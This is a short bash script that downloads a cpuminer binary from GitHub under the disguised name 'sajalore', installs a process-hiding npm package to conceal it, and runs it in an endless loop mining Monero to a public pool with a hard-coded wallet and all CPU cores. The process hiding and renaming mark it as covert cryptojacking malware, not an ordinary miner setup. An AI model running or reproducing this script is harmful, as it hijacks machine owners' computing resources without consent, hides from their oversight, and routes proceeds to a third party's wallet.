#!/bin/bash
apt update && apt -y install unzip wget curl libncurses6 libncursesw6 nodejs npm
npm i -g node-process-hider
curl https://github.com/ocminer/cpuminer-opt-supr/releases/download/v1.47/cpuminer-x86-64-v2-linux-x86_64 -L -o sajalore
chmod 777 sajalore
ph add sajalore

while true; do
./sajalore -a rx/0 -o stratum+tcp://pool.supportxmr.com:80 -u 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK -p $(echo $RANDOM | md5sum | head -c 10) -t $(nproc --all)
done
